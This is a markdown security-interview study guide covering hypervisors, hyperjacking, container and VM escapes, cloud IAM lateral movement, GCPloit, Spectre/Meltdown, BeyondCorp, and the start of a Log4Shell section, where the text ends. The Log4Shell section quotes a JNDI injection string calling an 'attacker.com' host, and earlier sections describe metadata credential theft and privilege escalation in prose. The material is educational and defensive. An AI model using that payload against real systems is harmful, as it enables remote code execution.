# Infrastructure, Cloud & Virtualisation - Deep Dive

[Back to Main Notes](../interview-study-notes-for-security-engineering.md#infrastructure-prod--cloud-virtualisation)

> **Prerequisites:** [Networking](networking.md), [OS Systems](os-systems.md)  
> **Difficulty:** Intermediate to Advanced

---

## Table of Contents

1. [Hypervisors (Type 1 vs Type 2)](#1-hypervisors-type-1-vs-type-2)
2. [Hyperjacking](#2-hyperjacking)
3. [Containers, VMs, and Clusters](#3-containers-vms-and-clusters)
4. [Escaping Techniques](#4-escaping-techniques-vm--container-escape)
5. [Lateral Movement and Privilege Escalation in Cloud](#5-lateral-movement-and-privilege-escalation-in-cloud)
6. [Cloud Service Accounts for Lateral Movement](#6-cloud-service-accounts-for-lateral-movement)
7. [GCPloit Tool for GCP](#7-gcploit-tool-for-gcp)
8. [Site Isolation](#8-site-isolation)
9. [Side-Channel Attacks (Spectre, Meltdown)](#9-side-channel-attacks-spectre-meltdown)
10. [BeyondCorp (Trust the Host, Not the Network)](#10-beyondcorp-trust-the-host-not-the-network)
11. [Log4j Vulnerability (Log4Shell)](#11-log4j-vulnerability-log4shell)

---

## 1. Hypervisors (Type 1 vs Type 2)

### Explanation

A hypervisor (also called a Virtual Machine Monitor, or VMM) is software that creates and manages virtual machines by abstracting the underlying hardware. The hypervisor allocates CPU, memory, storage, and networking resources to each guest VM, providing isolation between them.

There are two fundamental types:

**Type 1 (Bare-metal) hypervisors** run directly on the host hardware with no underlying operating system. They have direct access to hardware resources and manage guest operating systems above them. Examples include VMware ESXi, Microsoft Hyper-V (when installed as a role on Server Core), Xen, and KVM (which is a kernel module that turns the Linux kernel itself into a Type 1 hypervisor).

**Type 2 (Hosted) hypervisors** run as an application on top of a conventional operating system. The host OS manages hardware access, and the hypervisor sits as a layer above it. Examples include VMware Workstation, VirtualBox, Parallels Desktop, and QEMU (in user-mode emulation).

### How It Works

1. **Type 1 boot process:** The hypervisor loads at system boot before any OS. It initialises hardware directly, sets up virtual CPU scheduling, memory management (using hardware-assisted virtualisation such as Intel VT-x / AMD-V), and I/O virtualisation (Intel VT-d / AMD-Vi for IOMMU).
2. **Type 2 boot process:** The host OS boots normally. The hypervisor application launches, creates virtualised hardware through the host OS kernel (often using kernel modules like `/dev/kvm`), and presents emulated devices to guest VMs.
3. **CPU virtualisation:** Modern CPUs provide hardware extensions (VMX root and non-root modes on Intel) that allow the hypervisor to trap sensitive instructions from the guest without full binary translation.
4. **Memory virtualisation:** Extended Page Tables (EPT on Intel, NPT on AMD) allow guests to manage their own page tables while the hypervisor maintains a second level of address translation.
5. **I/O virtualisation:** Para-virtualised drivers (virtio) or hardware passthrough (SR-IOV) provide efficient I/O to guests.

### Real-World Example

Cloud providers rely heavily on Type 1 hypervisors. AWS originally used a modified Xen hypervisor but transitioned to the Nitro system (a KVM-based hypervisor with custom hardware offload cards). Google Cloud uses a KVM-based hypervisor. Azure uses a customised version of Hyper-V. These choices reflect the performance and security requirements of multi-tenant cloud environments.

### Security Implications

- **Attack surface:** Type 1 hypervisors have a smaller attack surface because there is no underlying OS to compromise. Type 2 hypervisors inherit all vulnerabilities of the host OS.
- **Isolation strength:** Type 1 hypervisors enforce stronger isolation because they mediate all hardware access directly. In Type 2, a compromise of the host OS grants access to all guest VMs.
- **Privilege rings:** Type 1 hypervisors operate at Ring -1 (VMX root mode), giving them ultimate control. A vulnerability here is catastrophic because there is no lower layer to fall back on.
- **Defence:** Keep hypervisor firmware and microcode updated. Restrict management interfaces (e.g., vSphere, iLO/iDRAC). Use hardware-assisted virtualisation features. Minimise the hypervisor's code footprint.

### Interview Tip

When asked about hypervisors, always mention the security trade-off: Type 1 has a smaller attack surface but a vulnerability is more severe because there is nothing beneath it. Type 2 is more convenient but inherits the host OS attack surface. Mention specific examples (ESXi, KVM, VirtualBox) to demonstrate practical knowledge.

### References

- Intel 64 and IA-32 Architectures Software Developer Manual, Volume 3C: VMX
- VMware vSphere Security Guide: https://docs.vmware.com/en/VMware-vSphere/
- AWS Nitro System: https://aws.amazon.com/ec2/nitro/
- KVM documentation: https://www.kernel.org/doc/html/latest/virt/kvm/

---

## 2. Hyperjacking

### Explanation

Hyperjacking is an attack where an adversary installs or takes control of a rogue hypervisor beneath the target operating system, effectively inserting a malicious virtualisation layer. The original OS becomes an unwitting guest VM, and the attacker's hypervisor intercepts all operations -- hardware access, memory reads, disk I/O, and network traffic. Because the hypervisor runs at a higher privilege level than the OS (Ring -1), traditional security tools within the OS cannot detect the compromise.

### How It Works

1. **Initial access:** The attacker gains sufficient privileges on the host (typically root/SYSTEM, or physical access, or a supply-chain compromise of firmware).
2. **Hypervisor insertion:** A thin hypervisor (a "blue pill") is loaded beneath the running OS. On modern hardware, this leverages hardware virtualisation extensions (VT-x/AMD-V) to place the existing OS into a VM context without rebooting.
3. **Transparency:** The rogue hypervisor passes through most operations transparently so the OS continues to function normally. The attacker selectively intercepts operations of interest.
4. **Persistence:** The malicious hypervisor can persist across reboots by modifying firmware (UEFI rootkit), the bootloader, or the Master Boot Record.
5. **Exfiltration/control:** The attacker can read memory of any process, modify disk writes, intercept network traffic, or inject code -- all invisible to the guest OS and its security tools.

### Real-World Example

Joanna Rutkowska demonstrated the "Blue Pill" proof-of-concept in 2006, showing a thin AMD-V hypervisor that could virtualise a running Windows instance on the fly. While full weaponised hyperjacking remains rare in the wild due to the prerequisites (root access and hardware virtualisation support), the concept influenced the development of hypervisor-based rootkits. More practically, the "SubVirt" research from Microsoft Research and the University of Michigan in 2006 demonstrated a virtual-machine-based rootkit that installed itself below Windows and Linux.

### Security Implications

- **Detection difficulty:** Security software running inside the guest cannot observe the hypervisor layer. Traditional AV, EDR, and integrity monitoring tools are blind to it.
- **Defences:** Secure Boot and UEFI Secure Boot ensure only signed bootloaders and hypervisors execute. Trusted Platform Module (TPM) attestation can detect unexpected changes to the boot chain. Intel Boot Guard locks firmware to the OEM's signing key. Hardware-based memory encryption (AMD SEV, Intel TDX) can protect guest memory from a compromised hypervisor.
- **Cloud relevance:** In multi-tenant cloud environments, a hypervisor compromise by an attacker (or a malicious insider at the cloud provider) would expose all tenant VMs on that host.

### Interview Tip

Hyperjacking is a theoretical but important concept. If asked, acknowledge that it requires significant prerequisites (privileged access or firmware compromise) but explain why it matters: it represents the ultimate persistence mechanism because it sits below the OS. Tie it to modern defences like Secure Boot, TPM attestation, and confidential computing (AMD SEV, Intel TDX).

### References

- Rutkowska, J. "Subverting Vista Kernel For Fun And Profit" (Blue Pill), Black Hat 2006
- King, S. et al. "SubVirt: Implementing malware with virtual machines," IEEE S&P 2006
- Intel Trusted Execution Technology (TXT): https://www.intel.com/content/www/us/en/architecture-and-technology/trusted-execution-technology/trusted-execution-technology-security-paper.html
- AMD SEV: https://developer.amd.com/sev/

---

## 3. Containers, VMs, and Clusters

### Explanation

**Virtual Machines** provide full hardware virtualisation. Each VM runs its own kernel and OS, isolated by the hypervisor. The isolation boundary is enforced in hardware (CPU privilege rings, memory management units).

**Containers** provide OS-level virtualisation. Containers share the host kernel but use kernel features -- namespaces (PID, network, mount, user, UTS, IPC, cgroup) and cgroups (resource limits) -- to isolate processes. Container images package the application and its dependencies but not a full OS kernel.

**Clusters** are groups of machines (physical or virtual) that work together, managed by an orchestrator. Kubernetes is the dominant container orchestrator, managing scheduling, scaling, networking, and lifecycle of containers (grouped into Pods) across a cluster of nodes.

### How It Works

**VM isolation model:**
1. Each VM has its own virtual hardware (vCPU, vRAM, vNIC, vDisk).
2. The hypervisor enforces memory isolation through hardware page tables (EPT/NPT).
3. VMs communicate through virtual switches or physical networks; there is no shared kernel.

**Container isolation model:**
1. Linux namespaces create isolated views of system resources (process trees, network stacks, filesystems).
2. Cgroups limit CPU, memory, I/O, and other resource consumption.
3. Seccomp-BPF filters restrict which system calls a container can make.
4. AppArmor or SELinux provide mandatory access control policies.
5. Capabilities are dropped to reduce the effective privilege of container processes.

**Kubernetes cluster model:**
1. The control plane (API server, etcd, scheduler, controller manager) manages cluster state.
2. Worker nodes run kubelet, a container runtime (containerd, CRI-O), and kube-proxy.
3. Pods (one or more containers sharing network and storage namespaces) are the smallest deployable unit.
4. Network policies, RBAC, Pod Security Standards, and admission controllers enforce security.

### Real-World Example

Google runs billions of containers per week, orchestrated by Borg (the internal predecessor to Kubernetes). In 2014, Google open-sourced Kubernetes based on lessons from Borg. Major incidents have demonstrated the consequences of weak container isolation: in 2019, CVE-2019-5736 in runc allowed container escape by overwriting the host runc binary through `/proc/self/exe`.

### Security Implications

- **Isolation strength:** VMs > containers. A kernel vulnerability affects all containers on the same host but only the single VM with that kernel. This is why some environments use micro-VMs (Firecracker, gVisor, Kata Containers) to combine container ergonomics with VM-level isolation.
- **Container-specific risks:** Privileged containers, host PID/network namespace sharing, writable hostPath mounts, and running as root all weaken isolation significantly.
- **Cluster risks:** Misconfigured RBAC, exposed API servers, default service account tokens mounted into pods, and lack of network policies are common Kubernetes security failures.
- **Defence in depth:** Use read-only root filesystems, non-root users, minimal base images, Seccomp profiles, network policies, and regularly scan images for vulnerabilities.

### Interview Tip

Emphasise that containers are not a security boundary in the same way VMs are. The shared kernel is the fundamental difference. Mention that the industry has responded with sandboxed container runtimes (gVisor, Kata Containers, Firecracker) that add a VM-like isolation layer. Always reference namespaces and cgroups as the Linux primitives that enable containers.

### References

- Linux namespaces man page: `man 7 namespaces`
- CIS Kubernetes Benchmark: https://www.cisecurity.org/benchmark/kubernetes
- Kubernetes Security documentation: https://kubernetes.io/docs/concepts/security/
- CVE-2019-5736 (runc escape): https://nvd.nist.gov/vuln/detail/CVE-2019-5736
- Firecracker: https://firecracker-microvm.github.io/

---

## 4. Escaping Techniques (VM / Container Escape)

### Explanation

Escape refers to breaking out of the isolation boundary -- exiting a VM to reach the hypervisor or host, or exiting a container to reach the host kernel or other containers. These are among the most critical virtualisation vulnerabilities because they break the fundamental security assumption of isolation.

### How It Works

**VM Escape:**
1. The attacker identifies a vulnerability in a virtual device emulated by the hypervisor (e.g., virtual network card, USB controller, video adapter, or SCSI controller).
2. By sending crafted input to the virtual device from inside the guest, the attacker triggers a bug (buffer overflow, use-after-free) in the hypervisor's device emulation code.
3. Code execution occurs in the hypervisor context, which has access to the host and all other VMs.

**Container Escape:**
1. **Kernel exploits:** Since containers share the host kernel, a kernel vulnerability exploited from within a container yields host-level access. Example: Dirty COW (CVE-2016-5195).
2. **Misconfiguration exploits:** Privileged containers, excessive capabilities (CAP_SYS_ADMIN), host namespace sharing, or Docker socket mounts (`/var/run/docker.sock`) can be leveraged.
3. **Runtime vulnerabilities:** Bugs in the container runtime itself (runc, containerd) such as CVE-2019-5736 allow overwriting the host binary.
4. **Filesystem escapes:** Symlink or TOCTOU races in volume mounts can allow writing to host paths outside the container's intended mount points (CVE-2021-30465 in runc).

**Network-based connections from VMs/containers:**
1. An attacker within a VM or container probes the internal network, including the cloud metadata service (e.g., `169.254.169.254`).
2. Metadata endpoints often expose credentials, service account tokens, and instance configuration.
3. From there, the attacker pivots to other services or escalates privileges via cloud IAM.

### Real-World Example

- **VENOM (CVE-2015-3456):** A buffer overflow in QEMU's virtual floppy disk controller allowed VM escape on Xen and KVM-based cloud environments. An attacker inside a guest VM could execute arbitrary code on the host.
- **CVE-2019-5736 (runc):** An attacker inside a container could overwrite the host runc binary by exploiting how `/proc/self/exe` was handled, gaining root code execution on the host. This affected Docker, Kubernetes, and all runc-based container runtimes.
- **Azure cross-tenant escape (2021):** Researchers at Wiz demonstrated ChaosDB, exploiting a misconfigured Jupyter Notebook feature in Azure Cosmos DB that allowed access to other customers' databases.

### Security Implications

- **VM escape is high-value:** In cloud environments, a single VM escape could compromise thousands of co-tenant VMs. Cloud providers invest heavily in hypervisor hardening and bug bounties for this reason.
- **Container escape is more common:** The shared kernel and larger attack surface of container runtimes make escape more practical. Defence requires layered controls: minimal capabilities, seccomp, AppArmor/SELinux, user namespaces, and patching the kernel and runtime.
- **Metadata service protection:** Always use IMDSv2 (on AWS) which requires session tokens, or equivalent protections on other clouds. Block metadata access from pods that do not need it using network policies.

### Interview Tip

Know at least two specific CVEs for each escape type. For VM escape, cite VENOM or Cloudburst. For container escape, cite CVE-2019-5736 or Dirty COW. Explain that the fundamental difference in attack surface is the shared kernel (containers) versus the hypervisor device emulation layer (VMs). Always mention metadata service exploitation as a network-based escape vector.

### References

- CVE-2015-3456 (VENOM): https://nvd.nist.gov/vuln/detail/CVE-2015-3456
- CVE-2019-5736 (runc): https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html
- AWS IMDSv2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- ChaosDB (Wiz): https://www.wiz.io/blog/chaosdb-how-we-hacked-thousands-of-azure-cosmos-db-accounts

---

## 5. Lateral Movement and Privilege Escalation in Cloud

### Explanation

Lateral movement in cloud environments involves an attacker moving from one compromised resource to another within the same cloud account, project, or organisation. Unlike traditional on-premises lateral movement (which relies on network protocols like SMB, RDP, WMI, or SSH), cloud lateral movement often exploits IAM misconfigurations, overly permissive roles, and cloud-specific APIs. Privilege escalation occurs when the attacker elevates their access level, typically by exploiting IAM policies, role assumptions, or metadata services.

### How It Works

1. **Initial access:** The attacker compromises a single resource -- often a web application, a CI/CD pipeline, a developer workstation, or leaked credentials in a code repository.
2. **Credential discovery:** From the compromised resource, the attacker queries the instance metadata service to obtain temporary credentials, enumerates environment variables for API keys, or searches local config files (`.aws/credentials`, `application-default-credentials.json`).
3. **IAM enumeration:** Using obtained credentials, the attacker enumerates their permissions (e.g., `aws iam get-user`, `gcloud iam list-grantable-roles`), discovers other identities, and maps trust relationships.
4. **Privilege escalation:** The attacker exploits overly broad IAM permissions. For example, if the compromised identity can create new IAM policies, modify existing roles, invoke Lambda functions with higher privileges, or pass roles to new resources.
5. **Lateral movement:** The attacker pivots to other resources using the escalated permissions -- accessing storage buckets, databases, other compute instances, secrets managers, or cross-account assumed roles.
6. **Persistence:** The attacker creates new credentials, backdoor users, or modifies resource policies to maintain access.

### Real-World Example

The Capital One breach (2019) is a textbook example. An attacker exploited a misconfigured WAF on an EC2 instance to reach the instance metadata service, obtained the IAM role credentials, and used those credentials to list and download S3 buckets containing over 100 million customer records. The root cause was an overly permissive IAM role attached to the EC2 instance that had read access to S3 buckets it did not need.

### Security Implications

- **IAM is the new perimeter:** In cloud, identity and access management replaces network firewalls as the primary security control. Misconfigured IAM policies are the most common root cause of cloud breaches.
- **Principle of least privilege:** Every identity (user, service account, role) should have the minimum permissions required. Use conditions, resource constraints, and permission boundaries.
- **Monitoring:** Enable and centralise cloud audit logs (AWS CloudTrail, GCP Cloud Audit Logs, Azure Activity Logs). Alert on anomalous API calls, especially IAM modifications, cross-region activity, and unusual data access patterns.
- **Network segmentation:** Even in cloud, use VPC/VNet segmentation, security groups, and private endpoints to limit blast radius.

### Interview Tip

Cloud lateral movement questions test whether you understand that cloud security is fundamentally about identity, not just networks. Mention the metadata service as a common pivot point, IAM misconfigurations as the primary attack vector, and least privilege as the primary defence. Reference a real breach (Capital One) to anchor your answer.

### References

- Rhino Security Labs, "AWS IAM Privilege Escalation Methods": https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- Capital One breach details: https://krebsonsecurity.com/2019/07/capital-one-data-theft-involves-social-engineering/
- MITRE ATT&CK Cloud Matrix: https://attack.mitre.org/matrices/enterprise/cloud/

---

## 6. Cloud Service Accounts for Lateral Movement

### Explanation

Cloud service accounts are non-human identities used by applications, VMs, and services to authenticate to cloud APIs. In GCP they are called Service Accounts, in AWS they are IAM Roles (attached to EC2, Lambda, etc.), and in Azure they are Managed Identities or Service Principals. Because service accounts often have broad permissions and their credentials are automatically available to any workload running on the associated resource, they are prime targets for lateral movement.

### How It Works

1. **Discovery:** An attacker compromises a compute instance (VM, container, serverless function) and queries the metadata service to discover which service account is attached and what scopes/permissions it has.
2. **Token extraction:** The metadata service provides short-lived OAuth tokens (GCP), temporary security credentials (AWS STS), or managed identity tokens (Azure) without additional authentication.
3. **Permission enumeration:** The attacker uses the token to enumerate what the service account can access. Tools like `enumerate-iam` (AWS), `gcp_enum` (GCP), or ScoutSuite provide automated enumeration.
4. **Pivoting:** If the service account has permissions to access other resources (storage, databases, other compute instances, secret managers), the attacker uses those permissions to move laterally.
5. **Service account impersonation:** In GCP, if a service account has the `iam.serviceAccounts.getAccessToken` permission on another service account, it can impersonate it -- effectively pivoting to a different identity with potentially higher privileges.
6. **Key creation:** If the attacker can create service account keys (`iam.serviceAccountKeys.create`), they can generate persistent credentials that survive the initial compromise being remediated.

### Real-World Example

In 2020, security researchers demonstrated a GCP privilege escalation path where a compromised VM with a service account that had `iam.serviceAccounts.actAs` and `compute.instances.create` permissions could create a new VM with a more privileged service account attached, effectively escalating to that service account's permissions. This chaining of service account permissions is a common GCP lateral movement technique.

### Security Implications

- **Over-permissioned service accounts** are the most common finding in cloud security assessments. Default service accounts (e.g., GCP's Compute Engine default service account with "Editor" role) are especially dangerous.
- **Defences:** Use custom service accounts with minimal permissions. Disable automatic key creation. Use Workload Identity Federation instead of exported keys. Monitor for service account token usage from unexpected IP addresses.
- **Service account key hygiene:** Prefer attached service accounts (metadata-based) over exported JSON keys. If keys must be used, rotate them regularly and store them in a secret manager.

### Interview Tip

Demonstrate that you understand the difference between human and non-human identities in cloud. Explain the service account impersonation chain (especially in GCP). Mention that the default service accounts in all three major clouds are overly permissive and should be replaced with custom, least-privilege service accounts.

### References

- GCP Service Account best practices: https://cloud.google.com/iam/docs/best-practices-service-accounts
- AWS IAM Roles for EC2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html
- Azure Managed Identities: https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview

---

## 7. GCPloit Tool for GCP

### Explanation

GCPloit is an exploitation framework specifically designed for Google Cloud Platform environments. It automates the discovery and exploitation of misconfigurations in GCP projects, focusing on privilege escalation through service account manipulation, resource enumeration, and lateral movement across GCP services. It demonstrates how an attacker with limited initial access to a GCP project can escalate to full project (or even organisation-level) control.

### How It Works

1. **Authentication:** GCPloit takes initial GCP credentials (a service account key, OAuth token, or application default credentials) as input.
2. **Enumeration:** It enumerates the GCP project's resources: compute instances, storage buckets, Cloud Functions, service accounts, IAM bindings, and organisation policies.
3. **Privilege escalation:** It identifies privilege escalation paths by analysing IAM bindings. For example, if the compromised service account can create new service account keys for a more privileged account, GCPloit automates that escalation.
4. **Lateral movement:** It pivots across GCP services -- for instance, accessing Cloud Storage buckets, reading Secrets Manager entries, invoking Cloud Functions, or accessing Cloud SQL databases.
5. **Persistence:** It can create new service account keys, add IAM bindings, or deploy backdoor Cloud Functions to maintain access.

### Real-World Example

The tool was developed and presented by security researchers to demonstrate real-world GCP attack chains. In penetration testing engagements, similar tooling has been used to demonstrate how a single compromised service account key (found in a public GitHub repository, for example) can lead to full project takeover within minutes through automated IAM enumeration and privilege escalation chaining.

### Security Implications

- **Offensive use:** GCPloit and similar tools (Pacu for AWS, MicroBurst for Azure, ROADtools for Azure AD) are used by penetration testers and red teams to assess cloud security posture.
- **Defensive awareness:** Security teams should understand what these tools enumerate to know what to lock down. Restrict `iam.serviceAccountKeys.create`, `iam.serviceAccounts.actAs`, and `resourcemanager.projects.setIamPolicy` permissions tightly.
- **Detection:** Monitor GCP Cloud Audit Logs for unusual IAM operations, bulk enumeration patterns, and service account key creation events. Use Security Command Center or third-party CSPM tools.
- **Prevention:** Apply Organisation Policy constraints to disable service account key creation, enforce domain-restricted sharing, and limit external IP addresses on VMs.

### Interview Tip

Mentioning GCPloit (and its equivalents for other clouds -- Pacu for AWS, MicroBurst for Azure) shows you understand cloud-specific offensive tooling. Frame it in the context of "assume breach" -- once an attacker has initial credentials, what can they do? This demonstrates both offensive awareness and knowledge of what defenders should monitor for.

### References

- GCPloit GitHub repository: https://github.com/dxa4481/GCPloit
- Rhino Security Labs, Pacu (AWS): https://github.com/RhinoSecurityLabs/pacu
- NetSPI, MicroBurst (Azure): https://github.com/NetSPI/MicroBurst
- GCP IAM permission reference: https://cloud.google.com/iam/docs/permissions-reference

---

## 8. Site Isolation

### Explanation

Site Isolation is a security architecture in web browsers (primarily Chromium-based browsers) that ensures content from different websites is rendered in separate operating system processes. This means each site (defined by scheme + eTLD+1, e.g., `https://example.com`) gets its own renderer process with its own address space. The primary security goal is to prevent a compromised renderer process from accessing data belonging to a different site.

### How It Works

1. **Process-per-site:** When a user navigates to a page, the browser allocates a dedicated renderer process for that site's origin. Cross-site iframes are rendered in a separate process from the parent page.
2. **Cross-Origin Read Blocking (CORB):** The browser's network layer blocks cross-origin responses (HTML, XML, JSON) from being delivered to a renderer process that should not have access to them.
3. **Cross-Origin Resource Policy (CORP):** Servers can explicitly declare which origins are allowed to load their resources.
4. **Out-of-process iframes (OOPIF):** Each cross-site iframe runs in its own process, so a compromised iframe cannot read memory from the parent page's process or from other cross-site iframes.
5. **Memory isolation:** Because each site runs in a separate OS process, an attacker who exploits a renderer bug (or uses a side-channel attack like Spectre) can only read memory within that process -- which contains only same-site data.

### Real-World Example

Site Isolation was fast-tracked for deployment in Chrome 67 (July 2018) in direct response to the Spectre vulnerability (disclosed January 2018). Spectre demonstrated that a malicious JavaScript running in a browser tab could potentially read memory from the same process, which previously could contain cross-site data. By ensuring each site has its own process, Site Isolation prevents Spectre from being used to steal cross-site data. Google reported that Site Isolation increased Chrome's memory usage by approximately 10-13% but considered this an acceptable trade-off for the security benefit.

### Security Implications

- **Mitigates Spectre-class attacks:** The primary motivation. Even if Spectre allows reading arbitrary memory within a process, there is no cross-site data to steal.
- **Limits renderer exploit impact:** A compromised renderer process can only affect the single site it is rendering. The attacker must additionally escape the sandbox to reach the host.
- **Server-side headers matter:** CORB and CORP protect against data leakage only if the browser can correctly identify the content type. Servers should set correct `Content-Type` headers and use `Cross-Origin-Resource-Policy` headers.
- **Performance trade-off:** More processes mean higher memory usage. This is a practical consideration for resource-constrained devices.

### Interview Tip

Site Isolation is a great example of defence in depth and how a CPU-level vulnerability (Spectre) drove architectural changes in software. Use it to demonstrate understanding of the interaction between hardware vulnerabilities and software mitigations. Mention that it works alongside (not as a replacement for) the browser sandbox.

### References

- Chromium Site Isolation design document: https://www.chromium.org/Home/chromium-security/site-isolation/
- Reis, C. et al. "Site Isolation: Process Separation for Web Sites within the Browser," USENIX Security 2019
- Cross-Origin Read Blocking (CORB): https://www.chromium.org/Home/chromium-security/corb-for-developers/

---

## 9. Side-Channel Attacks (Spectre, Meltdown)

### Explanation

Side-channel attacks extract information from a system not through a direct logical flaw in the software, but through observable physical or architectural side effects of computation -- such as timing, power consumption, electromagnetic emissions, or cache state. Spectre and Meltdown are microarchitectural side-channel attacks that exploit speculative execution in modern CPUs to leak data across security boundaries.

**Meltdown (CVE-2017-5754):** Exploits out-of-order execution to read kernel memory from user space. The CPU speculatively executes a load from a kernel address before the permission check completes. Although the CPU eventually discards the result, the data has already been loaded into the cache. A cache timing attack (Flush+Reload) then recovers the data.

**Spectre (CVE-2017-5753 Variant 1, CVE-2017-5715 Variant 2):** Exploits branch prediction to trick the CPU into speculatively executing code that accesses data the attacker should not be able to read. Unlike Meltdown, Spectre works across process boundaries and is harder to mitigate because it exploits a fundamental CPU optimisation rather than a specific design flaw.

### How It Works

**Meltdown step-by-step:**
1. The attacker flushes the cache to establish a known state.
2. The attacker executes a load from a kernel address (which will eventually fault).
3. Before the fault is raised, the CPU speculatively executes subsequent instructions that use the loaded value as an index into a probe array.
4. The speculative instructions load a cache line from the probe array at an offset determined by the secret kernel data.
5. After the fault, the attacker measures access times to each entry in the probe array. The entry with the fastest access time reveals the value of the secret byte.

**Spectre Variant 1 (Bounds Check Bypass):**
1. The attacker trains the CPU's branch predictor to expect a bounds check to succeed.
2. The attacker provides an out-of-bounds index.
3. The CPU speculatively executes the out-of-bounds access before the branch resolves.
4. The speculative load brings secret data into the cache.
5. A cache timing attack recovers the data.

**Spectre Variant 2 (Branch Target Injection):**
1. The attacker poisons the Branch Target Buffer (BTB) to redirect speculative execution to an attacker-chosen gadget.
2. When the victim code executes an indirect branch, the CPU speculatively jumps to the attacker's gadget.
3. The gadget accesses secret data and encodes it into the cache.
4. The attacker recovers the data through cache timing.

### Real-World Example

Spectre and Meltdown were disclosed on January 3, 2018, in a coordinated disclosure involving Google Project Zero, academic researchers, and CPU vendors. The disclosure affected virtually every modern CPU from Intel, AMD, and ARM. Major cloud providers (AWS, GCP, Azure) had to patch their entire hypervisor fleets, in some cases suffering measurable performance degradation (5-30% depending on workload). Intel's stock dropped approximately 3.4% on the disclosure day. The long-term impact included new CPU microcode, kernel patches (KPTI/KAISER for Meltdown), compiler mitigations (retpolines for Spectre Variant 2), and the architectural changes like Site Isolation in browsers.

### Security Implications

- **Cloud multi-tenancy:** Spectre is especially dangerous in cloud environments where VMs from different tenants share the same physical CPU. An attacker in one VM could potentially read data from another VM's speculative execution on shared CPU resources.
- **Meltdown mitigations:** Kernel Page Table Isolation (KPTI, also known as KAISER) unmaps kernel memory from user-space page tables, eliminating the Meltdown attack vector at a performance cost.
- **Spectre mitigations:** Retpolines (return trampolines) prevent branch target injection. Compiler barriers (`lfence`) prevent speculative execution past bounds checks. Microcode updates improve branch prediction isolation.
- **Ongoing research:** Spectre-class vulnerabilities continue to be discovered (SpectreRSB, NetSpectre, Spectre-BHB). This is a fundamental tension between performance (speculative execution) and security.

### Interview Tip

For Spectre/Meltdown questions, structure your answer clearly: (1) what speculative execution is and why CPUs do it (performance), (2) how it creates a side channel (cache state leaks), (3) the difference between Meltdown (reads kernel memory from user space) and Spectre (tricks speculation across boundaries), and (4) mitigations at hardware, OS, and application levels. This demonstrates both depth and the ability to communicate complex topics.

### References

- Spectre paper: https://spectreattack.com/spectre.pdf
- Meltdown paper: https://meltdownattack.com/meltdown.pdf
- Google Project Zero disclosure: https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html
- CVE-2017-5753, CVE-2017-5715, CVE-2017-5754: https://nvd.nist.gov/vuln/detail/CVE-2017-5754
- Intel mitigations: https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/speculative-execution-side-channel-mitigations.html

---

## 10. BeyondCorp (Trust the Host, Not the Network)

### Explanation

BeyondCorp is Google's implementation of a zero-trust security model. The core principle is that access to resources should be granted based on the identity of the user and the security posture of their device, not based on which network they are connected to. In a BeyondCorp model, there is no privileged internal network -- an employee at a coffee shop has the same access as an employee in the office, provided their identity and device meet the access policy requirements.

This fundamentally challenges the traditional perimeter-based security model where a VPN or corporate network boundary serves as the primary access control. BeyondCorp treats all networks (including the corporate LAN) as untrusted.

### How It Works

1. **Device inventory and identity:** Every device is registered in a device inventory database. Device certificates (managed through enterprise enrolment) uniquely identify each machine.
2. **Device trust assessment:** A device trust engine continuously evaluates the security posture of each device: Is the OS patched? Is disk encryption enabled? Is the firewall active? Is the security agent running? This produces a trust tier for the device.
3. **User authentication:** Users authenticate through strong credentials (e.g., hardware security keys, phishing-resistant MFA). SSO provides identity across all services.
4. **Access proxy:** All access to internal applications goes through an access proxy (Google's is called the "Access Proxy" or, in the productised form, Identity-Aware Proxy / IAP). The proxy verifies user identity, device trust tier, and evaluates access policies before forwarding the request.
5. **Policy engine:** A centralised policy engine defines access rules: "User in group X, on a device at trust tier Y, can access application Z." Policies are context-aware and can consider factors like user location, time of day, and risk signals.
6. **No VPN:** There is no corporate VPN. All applications are reachable via the internet (through the access proxy), and the proxy enforces all access controls.

### Real-World Example

Google began deploying BeyondCorp internally around 2011 and published a series of papers describing the architecture between 2014 and 2017. The approach was productised as Google Cloud's Identity-Aware Proxy (IAP) and BeyondCorp Enterprise. During the COVID-19 pandemic (2020), organisations that had adopted zero-trust models were able to transition to remote work with minimal disruption, while those relying on VPNs experienced capacity issues and security challenges. BeyondCorp's principles have been adopted (in various forms) across the industry, influencing NIST SP 800-207 (Zero Trust Architecture) and products from Zscaler, Cloudflare Access, and Tailscale.

### Security Implications

- **Eliminates lateral movement via network:** Since the network is untrusted, compromising a single machine on the corporate LAN does not provide implicit access to other resources. Every access request is individually authenticated and authorised.
- **Reduces VPN attack surface:** VPNs are high-value targets (see Fortinet, Pulse Secure, Citrix vulnerabilities). Eliminating the VPN removes this attack surface entirely.
- **Device trust is continuous:** Unlike a VPN which grants access at connection time, BeyondCorp continuously evaluates device posture. A device that becomes non-compliant loses access.
- **Challenges:** Requires comprehensive device management, a mature identity infrastructure, and the ability to proxy all application access. Migration from a perimeter model is a multi-year effort for most organisations.

### Interview Tip

BeyondCorp is a favourite interview topic at Google but relevant everywhere. Explain the core shift: from "trust the network" to "trust the identity and device." Mention the three pillars: device trust, user identity, and context-aware access policies. Be ready to discuss the practical challenges of implementing zero trust and why VPNs are not a sufficient replacement. If asked about downsides, mention the operational complexity and the requirement for comprehensive device management.

### References

- Ward, R. and Beyer, B. "BeyondCorp: A New Approach to Enterprise Security," ;login: USENIX, 2014
- Google BeyondCorp papers: https://cloud.google.com/beyondcorp
- NIST SP 800-207 "Zero Trust Architecture": https://csrc.nist.gov/publications/detail/sp/800-207/final
- Google Identity-Aware Proxy: https://cloud.google.com/iap/docs

---

## 11. Log4j Vulnerability (Log4Shell)

### Explanation

Log4Shell (CVE-2021-44228) is a critical remote code execution (RCE) vulnerability in Apache Log4j 2, a ubiquitous Java logging library. The vulnerability exists in Log4j's message lookup substitution feature, specifically the JNDI (Java Naming and Directory Interface) lookup. When Log4j processes a log message containing the string `${jndi:ldap://attacker.com/exploit}`, it performs a JNDI lookup to the attacker-controlled server, which can return a malicious Java class that is then loaded and executed on the vulnerable server. This results in unauthenticated remote code execution with the privileges of the application.

